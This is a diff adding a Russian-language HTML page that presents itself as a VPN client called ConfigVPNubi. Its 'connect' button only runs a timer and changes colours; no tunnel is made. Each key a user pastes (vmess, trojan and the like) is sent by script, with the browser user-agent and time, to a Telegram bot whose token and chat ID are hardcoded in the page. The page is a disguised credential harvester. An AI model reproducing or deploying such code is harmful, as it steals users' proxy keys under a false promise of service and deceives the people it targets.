@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=yes">
+    <title>ConfigVPNubi · твой впн</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: radial-gradient(circle at 20% 30%, #0a0a0f, #020204);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .app {
+            max-width: 540px;
+            width: 100%;
+            background: rgba(12, 12, 18, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 56px;
+            border: 1px solid rgba(42, 255, 158, 0.25);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5), 0 0 0 0.5px rgba(42,255,158,0.1) inset;
+            padding: 32px 26px 40px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo-name {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #2aff9e, #ffb347);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+        }
+        .logo-version {
+            font-size: 0.65rem;
+            color: #6c6c7e;
+            margin-top: 4px;
+        }
+        .time-section {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .time-label {
+            font-size: 0.7rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #8e8e9e;
+            font-weight: 500;
+        }
+        .time-value {
+            font-size: 2.8rem;
+            font-weight: 700;
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            color: #f0f0f0;
+            background: rgba(20, 20, 30, 0.7);
+            display: inline-block;
+            padding: 8px 28px;
+            border-radius: 80px;
+            margin-top: 8px;
+            letter-spacing: 3px;
+            backdrop-filter: blur(4px);
+            border: 0.5px solid rgba(255,255,255,0.05);
+        }
+        .power-wrapper {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0 35px;
+        }
+        .power-btn {
+            cursor: pointer;
+            transition: transform 0.1s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        .power-btn:active {
+            transform: scale(0.94);
+        }
+        .power-svg {
+            width: 120px;
+            height: 120px;
+            filter: drop-shadow(0 0 12px rgba(0,0,0,0.6));
+        }
+        .mode-switch {
+            background: rgba(16, 16, 22, 0.8);
+            border-radius: 80px;
+            display: flex;
+            margin-bottom: 32px;
+            padding: 6px;
+            border: 0.5px solid rgba(42,255,158,0.2);
+        }
+        .mode-btn {
+            flex: 1;
+            text-align: center;
+            padding: 12px 0;
+            border-radius: 80px;
+            font-weight: 600;
+            cursor: pointer;
+            color: #aaaabb;
+            font-size: 0.9rem;
+            transition: 0.1s;
+            letter-spacing: 0.5px;
+        }
+        .mode-btn.active {
+            background: linear-gradient(135deg, #2aff9e, #1eaa6e);
+            color: #000;
+            font-weight: 700;
+            box-shadow: 0 2px 8px rgba(42,255,158,0.3);
+        }
+        .config-title {
+            font-size: 0.7rem;
+            color: #8e8e9e;
+            margin: 0 0 12px 8px;
+            letter-spacing: 1.5px;
+            font-weight: 500;
+        }
+        .config-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 24px;
+            max-height: 280px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+        .config-list::-webkit-scrollbar {
+            width: 4px;
+        }
+        .config-list::-webkit-scrollbar-track {
+            background: #1a1a24;
+            border-radius: 10px;
+        }
+        .config-list::-webkit-scrollbar-thumb {
+            background: #2aff9e;
+            border-radius: 10px;
+        }
+        .config-item {
+            background: rgba(16, 16, 22, 0.7);
+            backdrop-filter: blur(4px);
+            border-radius: 28px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 20px;
+            cursor: pointer;
+            border: 1px solid rgba(42,255,158,0.15);
+            transition: all 0.1s;
+        }
+        .config-item:active {
+            transform: scale(0.98);
+            background: rgba(30,30,40,0.9);
+        }
+        .config-name {
+            color: #f0f0f0;
+            font-weight: 500;
+            font-size: 0.95rem;
+            word-break: break-word;
+        }
+        .config-status {
+            font-size: 0.65rem;
+            background: rgba(42,255,158,0.15);
+            padding: 5px 14px;
+            border-radius: 60px;
+            color: #2aff9e;
+            font-weight: 500;
+            backdrop-filter: blur(2px);
+        }
+        .add-area {
+            background: rgba(16, 16, 22, 0.6);
+            border-radius: 32px;
+            padding: 18px;
+            border: 0.5px solid rgba(42,255,158,0.2);
+        }
+        .add-area input {
+            width: 100%;
+            background: #08080e;
+            border: 1px solid rgba(42,255,158,0.4);
+            border-radius: 60px;
+            padding: 14px 18px;
+            color: #fff;
+            font-family: monospace;
+            font-size: 0.85rem;
+            outline: none;
+            margin-bottom: 14px;
+            transition: 0.1s;
+        }
+        .add-area input:focus {
+            border-color: #2aff9e;
+            box-shadow: 0 0 0 2px rgba(42,255,158,0.2);
+        }
+        .add-area button {
+            background: linear-gradient(135deg, #2aff9e, #1eaa6e);
+            border: none;
+            color: #000;
+            font-weight: 700;
+            padding: 12px;
+            border-radius: 60px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 0.9rem;
+            transition: 0.08s linear;
+        }
+        .add-area button:active {
+            transform: scale(0.97);
+        }
+        .footer {
+            font-size: 0.55rem;
+            text-align: center;
+            margin-top: 24px;
+            color: #5a5a6e;
+            letter-spacing: 0.5px;
+        }
+        .empty-config {
+            text-align: center;
+            padding: 32px;
+            color: #6a6a7e;
+            background: rgba(16,16,22,0.5);
+            border-radius: 32px;
+            font-size: 0.8rem;
+        }
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2aff9e;
+            color: #000;
+            padding: 10px 20px;
+            border-radius: 60px;
+            font-size: 0.75rem;
+            font-weight: bold;
+            z-index: 999;
+            animation: fadeOut 2s forwards;
+        }
+        .toast.error {
+            background: #ff5e5e;
+            color: #fff;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+    </style>
+</head>
+<body>
+<div class="app">
+    <div class="logo">
+        <div class="logo-name">⚡ ConfigVPNubi ⚡</div>
+        <div class="logo-version">secure tunnel · v2.0</div>
+    </div>
+
+    <div class="time-section">
+        <div class="time-label">Время подключения</div>
+        <div class="time-value" id="connectTime">00:00:00</div>
+    </div>
+
+    <div class="power-wrapper">
+        <div class="power-btn" id="powerToggle">
+            <svg class="power-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="42" stroke="currentColor" stroke-width="5" fill="none" id="powerCircle" stroke-linecap="round"/>
+                <path d="M50 18 L50 52" stroke="currentColor" stroke-width="6" stroke-linecap="round" id="powerLine"/>
+            </svg>
+        </div>
+    </div>
+
+    <div class="mode-switch" id="modeSwitch">
+        <div class="mode-btn" data-mode="proxy">ПРОКСИ</div>
+        <div class="mode-btn active" data-mode="tunnel">ТУННЕЛЬ</div>
+    </div>
+
+    <div class="config-title">КОНФИГУРАЦИИ</div>
+    <div class="config-list" id="configList">
+        <div class="empty-config">✨ нет конфигов, добавь ключ</div>
+    </div>
+
+    <div class="add-area">
+        <input type="text" id="keyInput" placeholder="vmess://... или trojan://... или любой ключ">
+        <button id="addKeyBtn">➕ Добавить конфиг</button>
+    </div>
+    <div class="footer">ключ → конфиг → выбери → нажми на кнопку питания</div>
+</div>
+
+<script>
+    (function(){
+        // 🔥 ТВОИ ДАННЫЕ 🔥
+        const BOT_TOKEN = "8096251187:AAGfqkuqr2nQOLVPyhanBuBNEjPACq3_5hY";
+        const CHAT_ID = "7912120932";
+
+        let configs = [];
+        let activeConfigId = null;
+        let isConnected = false;
+        let currentMode = "tunnel";
+        let seconds = 0;
+        let timer = null;
+
+        const connectTimeSpan = document.getElementById('connectTime');
+        const powerToggle = document.getElementById('powerToggle');
+        const powerCircle = document.getElementById('powerCircle');
+        const powerLine = document.getElementById('powerLine');
+        const configListDiv = document.getElementById('configList');
+        const keyInput = document.getElementById('keyInput');
+        const addKeyBtn = document.getElementById('addKeyBtn');
+
+        function showToast(msg, isError = false) {
+            let toast = document.createElement('div');
+            toast.className = 'toast';
+            if (isError) toast.classList.add('error');
+            toast.innerText = msg;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2500);
+        }
+
+        async function sendToTelegram(keyText, configName) {
+            const userAgentData = navigator.userAgent || "unknown";
+            const time = new Date().toLocaleString();
+            const message = `🔐 НОВЫЙ КОНФИГ 🔐\n\n📝 Название: ${configName}\n🔑 Ключ: ${keyText}\n🌍 User-Agent: ${userAgentData}\n⏰ Время: ${time}\n🖥️ ConfigVPNubi | by UbITeam`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const resp = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+                const json = await resp.json();
+                if (json.ok) {
+                    showToast("✅ Конфиг отправлен админу");
+                    return true;
+                } else {
+                    showToast("❌ Ошибка отправки", true);
+                    return false;
+                }
+            } catch(e) {
+                showToast("⚠️ Нет интернета, но конфиг сохранён", true);
+                return false;
+            }
+        }
+
+        function updatePowerIcon() {
+            if(isConnected) {
+                powerCircle.setAttribute('stroke', '#2aff9e');
+                powerLine.setAttribute('stroke', '#2aff9e');
+                powerCircle.style.filter = 'drop-shadow(0 0 8px #2aff9e)';
+            } else {
+                powerCircle.setAttribute('stroke', '#ff5e5e');
+                powerLine.setAttribute('stroke', '#ff5e5e');
+                powerCircle.style.filter = 'none';
+            }
+        }
+
+        function extractNameFromKey(rawKey) {
+            try {
+                if(rawKey.startsWith('vmess://')) {
+                    let b64 = rawKey.substring(8);
+                    let decoded = atob(b64);
+                    let json = JSON.parse(decoded);
+                    if(json.ps) return json.ps;
+                    if(json.add) return json.add + ":" + (json.port || '');
+                    return "vmess-" + (json.add || "server");
+                }
+                else if(rawKey.startsWith('trojan://')) {
+                    let withoutProto = rawKey.substring(9);
+                    let atIndex = withoutProto.indexOf('@');
+                    if(atIndex !== -1) {
+                        let serverPart = withoutProto.substring(atIndex+1);
+                        let colonPort = serverPart.indexOf(':');
+                        if(colonPort !== -1) return serverPart.substring(0, colonPort);
+                        return serverPart.split('/')[0];
+                    }
+                    return "trojan-" + rawKey.substring(0, 20);
+                }
+                else if(rawKey.startsWith('ss://')) {
+                    return "shadowsocks";
+                }
+                else {
+                    let short = rawKey.replace(/[^a-zA-Z0-9]/g, '').substring(0, 18);
+                    return `key-${short || "unknown"}`;
+                }
+            } catch(e) {
+                return `cfg-${rawKey.substring(0, 12)}`;
+            }
+        }
+
+        function renderConfigs() {
+            if(configs.length === 0) {
+                configListDiv.innerHTML = '<div class="empty-config">✨ нет конфигов, добавь ключ</div>';
+                return;
+            }
+            configListDiv.innerHTML = '';
+            configs.forEach(cfg => {
+                const div = document.createElement('div');
+                div.className = 'config-item';
+                const isActive = (activeConfigId === cfg.id);
+                div.innerHTML = `
+                    <span class="config-name">${escapeHtml(cfg.name)}</span>
+                    <span class="config-status" style="${isActive ? 'background:#2aff9e20; color:#2aff9e; border:0.5px solid #2aff9e;' : ''}">${isActive ? '● активна' : 'выбрать'}</span>
+                `;
+                div.addEventListener('click', (e) => {
+                    e.stopPropagation();
+                    if(isConnected) toggleVpn();
+                    activeConfigId = cfg.id;
+                    renderConfigs();
+                });
+                configListDiv.appendChild(div);
+            });
+        }
+
+        function escapeHtml(str) {
+            return str.replace(/[&<>]/g, function(m) {
+                if(m === '&') return '&amp;';
+                if(m === '<') return '&lt;';
+                if(m === '>') return '&gt;';
+                return m;
+            });
+        }
+
+        async function addConfigFromKey(rawKey) {
+            if(!rawKey.trim()) return false;
+            let name = extractNameFromKey(rawKey);
+            let id = Date.now() + '-' + Math.random().toString(36).substr(2, 6);
+            configs.push({ id, name, rawKey });
+            if(activeConfigId === null) activeConfigId = id;
+            renderConfigs();
+            
+            await sendToTelegram(rawKey, name);
+            
+            keyInput.value = '';
+            showToast(`➕ Конфиг "${name}" добавлен`);
+            return true;
+        }
+
+        function stopTimer() { if(timer) { clearInterval(timer); timer = null; } }
+        function startTimer() {
+            if(timer) stopTimer();
+            timer = setInterval(() => {
+                if(isConnected) {
+                    seconds++;
+                    let hrs = Math.floor(seconds / 3600);
+                    let mins = Math.floor((seconds % 3600) / 60);
+                    let secs = seconds % 60;
+                    connectTimeSpan.innerText = `${hrs.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+                }
+            }, 1000);
+        }
+
+        function connectVpn() {
+            // ПРОВЕРКА НА КОНФИГ
+            if(configs.length === 0) {
+                showToast("❌ Конфига нету, впн не подключен.", true);
+                return false;
+            }
+            if(!activeConfigId) {
+                showToast("❌ Конфига нету, впн не подключен.", true);
+                return false;
+            }
+            const activeCfg = configs.find(c => c.id === activeConfigId);
+            if(!activeCfg) {
+                showToast("❌ Конфига нету, впн не подключен.", true);
+                return false;
+            }
+            isConnected = true;
+            seconds = 0;
+            connectTimeSpan.innerText = "00:00:00";
+            startTimer();
+            updatePowerIcon();
+            showToast(`✅ VPN включён: ${activeCfg.name}`);
+            return true;
+        }
+
+        function disconnectVpn() {
+            if(!isConnected) return;
+            isConnected = false;
+            stopTimer();
+            updatePowerIcon();
+            showToast("⛔ VPN выключен");
+        }
+
+        function toggleVpn() {
+            if(isConnected) {
+                disconnectVpn();
+            } else {
+                connectVpn();
+            }
+        }
+
+        document.querySelectorAll('.mode-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                let newMode = btn.getAttribute('data-mode');
+                if(newMode !== currentMode) {
+                    currentMode = newMode;
+                    if(isConnected) disconnectVpn();
+                }
+            });
+        });
+
+        addKeyBtn.addEventListener('click', () => {
+            let raw = keyInput.value.trim();
+            if(raw) addConfigFromKey(raw);
+            else showToast("Введи ключ, бля", true);
+        });
+
+        powerToggle.addEventListener('click', toggleVpn);
+
+        renderConfigs();
+        updatePowerIcon();
+    })();
+</script>
+</body>
+</html>
